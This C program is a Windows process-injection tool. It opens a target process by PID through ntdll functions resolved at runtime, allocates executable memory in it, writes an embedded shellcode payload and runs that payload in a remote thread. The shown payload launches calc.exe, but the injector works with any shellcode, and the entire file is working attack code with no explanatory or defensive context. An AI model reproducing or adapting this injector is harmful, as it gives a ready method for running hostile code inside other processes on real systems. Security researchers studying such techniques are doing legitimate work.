#include <stdio.h>
#include <windows.h>
#include <winbase.h>
#include "ntapi.h"

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

unsigned char payload[] = {
    "\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
    "\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
    "\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
    "\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
    "\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
    "\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
    "\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
    "\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
    "\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
    "\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
    "\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
    "\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
    "\x52\xff\xd0"
};

SIZE_T sPayload = sizeof(payload);

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("[!] Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    HANDLE hProcess, hThread;
    DWORD PID;
    PID = atoi(argv[1]);
    LPVOID address = NULL;
    NTSTATUS status;
    HMODULE hntdll;

    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
    CLIENT_ID CID = { (HANDLE)PID, NULL };

    hntdll = GetModuleHandleW(L"NTDLL.DLL");
    if (hntdll == NULL) {
        printf("[~~] Error in getting handle to NTDLL.DLL\n");
        return 1;
    }

    NtOpenProcess r00topen = (NtOpenProcess)GetProcAddress(hntdll, "NtOpenProcess");
    if (r00topen == NULL) {
        printf("[~~] Error in finding NtOpenProcess address\n");
        return 1;
    }

    NtAllocateVirtualMemory r00tmemory = (NtAllocateVirtualMemory)GetProcAddress(hntdll, "NtAllocateVirtualMemory");
    if (r00tmemory == NULL) {
        printf("[~~] Error in finding NtAllocateVirtualMemory address\n");
        return 1;
    }

    NtCreateThreadEx r00thread = (NtCreateThreadEx)GetProcAddress(hntdll, "NtCreateThreadEx");
    if (r00thread == NULL) {
        printf("[~~] Error in finding NtCreateThreadEx address\n");
        return 1;
    }

    NtClose r00tclose = (NtClose)GetProcAddress(hntdll, "NtClose");
    if (r00tclose == NULL) {
        printf("[~~] Error in finding NtClose address\n");
        return 1;
    }

    status = r00topen(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
    if (status != STATUS_SUCCESS) {
        printf("[!] ERROR in Opening Process: %lu\n", GetLastError());
        return 1;
    }

    SIZE_T regionSize = sPayload;
    status = r00tmemory(hProcess, &address, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != STATUS_SUCCESS) {
        printf("[!] ERROR in Allocating Memory: %lu\n", GetLastError());
        return 1;
    }

    if (!WriteProcessMemory(hProcess, address, payload, sPayload, NULL)) {
        printf("[!] ERROR in Writing Memory: %lu\n", GetLastError());
        return 1;
    }

    status = r00thread(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, address, NULL, 0, 0, 0, 0, NULL);
    if (status != STATUS_SUCCESS) {
        printf("[!] ERROR in Creating Remote Thread: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Successfully injected and created remote thread!\n");

    r00tclose(hThread);
    r00tclose(hProcess);
    return 0;
}
